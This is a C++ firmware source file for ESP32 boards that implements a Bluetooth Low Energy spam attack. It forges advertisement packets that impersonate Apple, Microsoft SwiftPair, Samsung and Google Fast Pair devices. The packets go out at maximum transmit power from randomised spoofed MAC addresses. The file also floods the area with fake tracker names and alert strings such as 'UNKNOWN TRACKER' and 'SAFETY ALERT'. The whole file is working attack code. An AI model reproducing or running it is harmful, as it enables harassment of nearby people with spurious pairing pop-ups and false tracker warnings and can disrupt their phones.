#include "ble_spam.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#ifdef CONFIG_BT_NIMBLE_ENABLED
#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif
#include "esp_mac.h"
#elif defined(CONFIG_BT_BLUEDROID_ENABLED)
#include "esp_gap_ble_api.h"
#endif
#include <globals.h>

#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) || defined(CONFIG_IDF_TARGET_ESP32C5)
#define MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

enum EBLEPayloadType { AppleIOS, Microsoft, SamsungWatch, SamsungBuds, SamsungRaw, GoogleFastPair, CustomName, NameFlood };

const char* flood_names[] = {
    "AirTag 1234", "Tile Mate 5678", "Samsung SmartTag",
    "Chipolo ONE", "Apple AirTag", "Tile Pro", "Eufy SmartTrack",
    "Nut 3", "Find My Device", "Smart Tracker", "Keys", "Wallet",
    "Backpack", "Camera", "Laptop", "Tablet", "Headphones",
    "LAST SEEN: NOW", "BATTERY: 15%", "LOW BATTERY", "SIGNAL LOST",
    "FIND MY NETWORK", "NEARBY DEVICE", "UNKNOWN TRACKER",
    "LOCATION SHARING", "SAFETY ALERT", "SECURITY NOTICE"
};

const int FLOOD_NAME_COUNT = sizeof(flood_names) / sizeof(flood_names[0]);

const char* samsung_watch_names[] = {
  "Fallback Watch", "White Watch4 Classic 44mm", "Black Watch4 Classic 40mm", 
  "White Watch4 Classic 40mm", "Black Watch4 44mm", "Silver Watch4 44mm", 
  "Green Watch4 44mm", "Black Watch4 40mm", "White Watch4 40mm", 
  "Gold Watch4 40mm", "French Watch4", "French Watch4 Classic", 
  "Fox Watch5 44mm", "Black Watch5 44mm", "Sapphire Watch5 44mm",
  "Purpleish Watch5 40mm", "Gold Watch5 40mm", "Black Watch5 Pro 45mm", 
  "Gray Watch5 Pro 45mm", "White Watch5 44mm", "White & Black Watch5", 
  "Black Watch6 Pink 40mm", "Gold Watch6 Gold 40mm", "Silver Watch6 Cyan 44mm", 
  "Black Watch6 Classic 43mm", "Green Watch6 Classic 43mm"
};

const uint8_t samsung_watch_ids[] = {
  0x1A,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,
  0x0A,0x0B,0x0C,0x11,0x12,0x13,0x14,0x15,0x16,0x17,
  0x18,0x1B,0x1C,0x1D,0x1E,0x20
};

struct DeviceType {
    uint32_t value;
};

const DeviceType android_models[] = {
    {0xCD8256}, {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, 
    {0x718FA4}, {0x0002F0}, {0x92BBBD}, {0x000006}, {0x060000},
    {0xD446A7}, {0x038B91}, {0x02F637}, {0x02D886}, {0xF00000},
    {0xF00001}, {0xF00201}, {0xF00209}, {0xF00205}, {0xF00305},
    {0xF00E97}, {0x04ACFC}, {0x04AA91}, {0x04AFB8}, {0x05A963},
    {0x05AA91}, {0x05C452}, {0x05C95C}, {0x0602F0}, {0x0603F0},
    {0x1E8B18}, {0x1E955B}, {0x1EC95C}, {0x06AE20}, {0x06C197},
    {0x06C95C}, {0x06D8FC}, {0x0744B6}, {0x07A41C}, {0x07C95C},
    {0x07F426}, {0x054B2D}, {0x0660D7}, {0x0903F0}
};

int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));
BLEAdvertising *pAdvertising;

void generateRandomMac(uint8_t *mac) {
    mac[0] = 0x02 | (random(256) & 0xFC);
    for (int i = 1; i < 6; i++) {
        mac[i] = random(256);
    }
}

const char *generateRandomName() {
    const char *charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = rand() % 8 + 3;
    char *randomName = (char *)malloc((len + 1) * sizeof(char));
    for (int i = 0; i < len; ++i) {
        randomName[i] = charset[rand() % strlen(charset)];
    }
    randomName[len] = '\0';
    return randomName;
}

void hexStringToBytes(const char* hexString, uint8_t* output, size_t outputLength) {
    for(size_t i = 0; i < outputLength; i++) {
        sscanf(hexString + (i * 2), "%2hhx", &output[i]);
    }
}

const char* getRandomBudsId() {
    const char* buds_ids[] = {
        "EE7A0C", "9D1700", "39EA48", "A7C62C", "850116",
        "3D8F41", "3B6D02", "AE063C", "B8B905", "EAAA17",
        "D30704", "9DB006", "101F1A", "859608", "8E4503",
        "2C6740", "3F6718", "42C519", "AE073A", "011716"
    };
    return buds_ids[random(20)];
}

uint8_t* createApplePacket(uint8_t deviceType, bool isContinuity = false) {
    static uint8_t packet[31];
    
    if(isContinuity) {
        uint8_t continuity_base[] = {
            0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
            0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, deviceType,
            0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
            0x00, 0x00
        };
        memcpy(packet, continuity_base, 23);
        memset(packet + 23, 0, 8);
        return packet;
    } else {
        uint8_t device_base[] = {
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, deviceType,
            0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
            0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };
        memcpy(packet, device_base, 31);
        return packet;
    }
}

bool setRandomBLEAddress() {
#if defined(CONFIG_BT_NIMBLE_ENABLED)
    uint8_t addr[6] = {0};
    addr[0] = 0x02 | (random(256) & 0xFC);
    addr[1] = random(256);
    addr[2] = random(256);
    addr[3] = random(256);
    addr[4] = random(256);
    addr[5] = random(256);
    
    esp_err_t err = esp_ble_gap_set_rand_addr(addr);
    return (err == ESP_OK);
#endif
    return false;
}

BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int specific_index = -1) {
    BLEAdvertisementData AdvData = BLEAdvertisementData();

    switch (Type) {
        case AppleIOS: {
            static int deviceIndex = 0;
            static bool useDevicePacket = true;
            
            if(useDevicePacket) {
                uint8_t deviceTypes[] = {0x02, 0x0E, 0x0A, 0x13, 0x14, 0x03, 0x0B, 0x0C, 0x11, 0x10};
                uint8_t* packet = createApplePacket(deviceTypes[deviceIndex % 10], false);
#ifdef NIMBLE_V2_PLUS
                AdvData.addData(packet, 31);
#else
                AdvData.addData(std::string((char*)packet, 31));
#endif
                deviceIndex++;
            } else {
                uint8_t continuityTypes[] = {0x01, 0x06, 0x20, 0xC0, 0x0D, 0x13};
                uint8_t* packet = createApplePacket(continuityTypes[deviceIndex % 6], true);
#ifdef NIMBLE_V2_PLUS
                AdvData.addData(packet, 23);
#else
                AdvData.addData(std::string((char*)packet, 23));
#endif
                deviceIndex++;
            }
            useDevicePacket = !useDevicePacket;
            break;
        }
        
        case Microsoft: {
            const char *Name = generateRandomName();
            uint8_t name_len = strlen(Name);
            uint32_t random_device_id = esp_random() & 0xFFFFFF;
            
            uint8_t AdvData_Raw[30 + name_len];
            uint8_t i = 0;
            
            AdvData_Raw[i++] = 6 + name_len;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x80;
            memcpy(&AdvData_Raw[i], Name, name_len);
            i += name_len;
            
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x2C;
            AdvData_Raw[i++] = 0xFE;
            
            AdvData_Raw[i++] = 0x17;
            AdvData_Raw[i++] = 0x16;
            AdvData_Raw[i++] = 0x2C;
            AdvData_Raw[i++] = 0xFE;
            
            AdvData_Raw[i++] = (random_device_id >> 16) & 0xFF;
            AdvData_Raw[i++] = (random_device_id >> 8) & 0xFF;
            AdvData_Raw[i++] = random_device_id & 0xFF;
            
            for(int j = 0; j < 15; j++) {
                AdvData_Raw[i++] = random(256);
            }
            
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(AdvData_Raw, i);
#else
            AdvData.addData(std::string((char *)AdvData_Raw, i));
#endif
            
            free((void*)Name);
            break;
        }
        
        case SamsungWatch: {
            uint8_t samsungPayload[14] = {
                0x02, 0x01, 0x06,
                0x03, 0x03, 0x6F, 0xFD,
                0x11, 0x07,
                0x75, 0x00,
                0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
                specific_index >= 0 ? samsung_watch_ids[specific_index % 26] : samsung_watch_ids[random(26)]
            };
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(samsungPayload, sizeof(samsungPayload));
#else
            AdvData.addData(std::string((char*)samsungPayload, sizeof(samsungPayload)));
#endif
            break;
        }
        
        case SamsungBuds: {
            const char* budsId = getRandomBudsId();
            uint8_t deviceId[3];
            hexStringToBytes(budsId, deviceId, 3);
            
            uint8_t budsPayload[17] = {
                0x02, 0x01, 0x06,
                0x03, 0x03, 0x6F, 0xFD,
                0x0E, 0xFF, 0x75, 0x00,
                0x42, 0x09, 0x81, 0x02,
                deviceId[0], deviceId[1], deviceId[2],
                0x00, 0x06, 0x3C, 0x94
            };
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(budsPayload, sizeof(budsPayload));
#else
            AdvData.addData(std::string((char*)budsPayload, sizeof(budsPayload)));
#endif
            break;
        }
        
        case SamsungRaw: {
            uint8_t rawPayload[26] = {
                0x02, 0x01, 0x06,
                0x03, 0x03, 0x6F, 0xFD,
                0x16, 0xFF, 0x75, 0x00,
                0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
                samsung_watch_ids[random(26)],
                random(256), random(256), random(256), random(256),
                random(256), random(256), random(256), random(256)
            };
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(rawPayload, sizeof(rawPayload));
#else
            AdvData.addData(std::string((char*)rawPayload, sizeof(rawPayload)));
#endif
            break;
        }
        
        case GoogleFastPair: {
            const uint32_t model = android_models[rand() % android_models_count].value;
            uint8_t Google_Data[14] = {
                0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE,
                (uint8_t)((model >> 0x10) & 0xFF),
                (uint8_t)((model >> 0x08) & 0xFF),
                (uint8_t)((model >> 0x00) & 0xFF),
                0x02, 0x0A, (uint8_t)((rand() % 120) - 100)
            };
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(Google_Data, 14);
#else
            AdvData.addData(std::string((char*)Google_Data, 14));
#endif
            break;
        }
        
        case NameFlood: {
            static int flood_index = 0;
            String floodName = String(flood_names[flood_index]);
            flood_index = (flood_index + 1) % FLOOD_NAME_COUNT;
            
            AdvData.setFlags(0x06);
            AdvData.setName(floodName.c_str());
            break;
        }
    }

    return AdvData;
}

void executeSpam(EBLEPayloadType type, int delayMs = 20, int specific_index = -1) {
    uint8_t macAddr[6];
    
    macAddr[0] = 0x02 | (random(256) & 0xFC);
    for (int i = 1; i < 6; i++) {
        macAddr[i] = random(256);
    }
    
    esp_base_mac_addr_set(macAddr);
    setRandomBLEAddress();
    
    BLEDevice::init("");
    vTaskDelay(5 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    
    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type, specific_index);
    
    uint32_t random_uuid = random() & 0xFFFF;
    char uuid_str[10];
    snprintf(uuid_str, sizeof(uuid_str), "%04X", random_uuid);
    String full_uuid = String("0000") + uuid_str + "-0000-1000-8000-00805f9b34fb";
    pAdvertising->addServiceUUID(BLEUUID(full_uuid.c_str()));
    
    pAdvertising->setAdvertisementData(advertisementData);
    
#ifdef NIMBLE_V2_PLUS
    pAdvertising->setAddress(BLEAddress(macAddr, BLE_ADDR_RANDOM));
#endif
    
    pAdvertising->start();
    vTaskDelay(delayMs / portTICK_PERIOD_MS);
    pAdvertising->stop();
    vTaskDelay(5 / portTICK_PERIOD_MS);
    
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit(true);
#endif
}

void executeCustomSpam(String spamName, bool isFloodMode = false) {
    uint8_t macAddr[6];
    
    macAddr[0] = 0x02 | (esp_random() & 0xFC);
    for (int i = 1; i < 6; i++) {
        macAddr[i] = esp_random() & 0xFF;
    }
    
    esp_base_mac_addr_set(macAddr);
    setRandomBLEAddress();
    
    BLEDevice::init("");
    vTaskDelay(5 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    
    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = BLEAdvertisementData();
    advertisementData.setFlags(0x06);
    advertisementData.setName(spamName.c_str());
    
    uint32_t service_id = esp_random() & 0xFFFF;
    char service_str[10];
    snprintf(service_str, sizeof(service_str), "%04X", service_id);
    String service_uuid = String("0000") + service_str + "-0000-1000-8000-00805f9b34fb";
    pAdvertising->addServiceUUID(BLEUUID(service_uuid.c_str()));
    
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    
    vTaskDelay(isFloodMode ? 10 : 20 / portTICK_PERIOD_MS);
    pAdvertising->stop();
    
    vTaskDelay(5 / portTICK_PERIOD_MS);
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit(true);
#endif
}

void aj_adv(int ble_choice) {
    int timer = 0;
    int count = 0;
    String spamName = "";
    static int samsung_index = 0;
    static int spam_all_index = 0;
    static int flood_name_index = 0;
    
    if (ble_choice == 7) { 
        spamName = keyboard("", 10, "Name to spam"); 
    }
    
    timer = millis();
    
    while (1) {
        if (millis() - timer > (ble_choice == 8 ? 30 : 100)) {
            switch (ble_choice) {
                case 0:
                    displayTextLine("Apple iOS (" + String(count) + ")");
                    executeSpam(AppleIOS, 15);
                    break;
                case 1:
                    displayTextLine("SwiftPair (" + String(count) + ")");
                    executeSpam(Microsoft, 20);
                    break;
                case 2:
                    displayTextLine("Samsung Watch (" + String(count) + ")");
                    executeSpam(SamsungWatch, 30, samsung_index);
                    samsung_index = (samsung_index + 1) % 26;
                    break;
                case 3:
                    displayTextLine("Samsung Buds (" + String(count) + ")");
                    executeSpam(SamsungBuds, 30);
                    break;
                case 4:
                    displayTextLine("Samsung Raw (" + String(count) + ")");
                    executeSpam(SamsungRaw, 30);
                    break;
                case 5:
                    displayTextLine("Google FastPair (" + String(count) + ")");
                    executeSpam(GoogleFastPair, 20);
                    break;
                case 6:
                    displayTextLine("Spam All (" + String(count) + ")");
                    switch(spam_all_index % 6) {
                        case 0: executeSpam(AppleIOS, 40); break;
                        case 1: executeSpam(SamsungWatch, 40, random(26)); break;
                        case 2: executeSpam(SamsungBuds, 40); break;
                        case 3: executeSpam(SamsungRaw, 40); break;
                        case 4: executeSpam(Microsoft, 40); break;
                        case 5: executeSpam(GoogleFastPair, 40); break;
                    }
                    spam_all_index++;
                    break;
                case 7:
                    displayTextLine("Custom Name (" + String(count) + ")");
                    executeCustomSpam(spamName);
                    break;
                case 8:
                    displayTextLine("Name Flood (" + String(count) + ")");
                    if(flood_name_index < FLOOD_NAME_COUNT) {
                        String floodName = String(flood_names[flood_name_index]);
                        executeCustomSpam(floodName, true);
                        flood_name_index++;
                        if(flood_name_index >= FLOOD_NAME_COUNT) {
                            flood_name_index = 0;
                        }
                    }
                    break;
            }
            count++;
            timer = millis();
        }

        if (check(EscPress)) {
            returnToMenu = true;
            break;
        }
    }

    BLEDevice::init("");
    vTaskDelay(100 / portTICK_PERIOD_MS);
    pAdvertising = nullptr;
    vTaskDelay(100 / portTICK_PERIOD_MS);
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit(true);
#endif
}
